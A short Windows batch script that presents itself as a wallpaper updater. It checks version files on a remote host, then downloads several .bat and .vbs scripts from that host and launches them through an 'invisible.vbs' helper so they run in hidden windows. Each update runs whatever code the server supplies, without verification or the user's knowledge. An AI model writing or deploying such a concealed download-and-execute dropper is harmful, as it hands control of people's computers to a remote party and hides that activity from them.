@echo off
if not exist version.txt ( goto install )

set /p version=<version.txt
curl -o version.txt https://api.klpnb.cn/version.txt
set /p lastest_version=<version.txt

set main_version=1
curl -o main_version.txt https://api.klpnb.cn/main_version.txt
set /p lastest_main_version=<main_version.txt

if not %main_version% == %lastest_main_version% ( goto main_updater )
if not %version% == %lastest_version% ( goto updater )
if not %errorlevel% == 1 ( goto wallpaper_download )


:wallpaper_download
set %errorlevel%=0
curl -o wallpaper.jpg https://api.klpnb.cn/wallpaper.jpg
if %errorlevel% == 1 ( goto wallpaper_download ) 
if not %errorlevel% == 1 ( goto mainloop_start )

:install
curl -o version.txt https://api.klpnb.cn/version.txt
goto updater

:main_updater

:updater
curl -o mainloop.bat https://api.klpnb.cn/mainloop.bat
curl -o msg.vbs https://api.klpnb.cn/msg.vbs
curl -o invisible.vbs https://api.klpnb.cn/invisible.vbs
curl -o wallpaper.bat https://api.klpnb.cn/wallpaper.bat
rem if not exist ffplay.exe ( curl -o ffplay.exe https://api.klpnb.cn/ffplay.exe )

curl -o main.bat https://api.klpnb.cn/main.bat
invisible.vbs main.bat

:mainloop_start
invisible.vbs mainloop.bat
invisible.vbs wallpaper.bat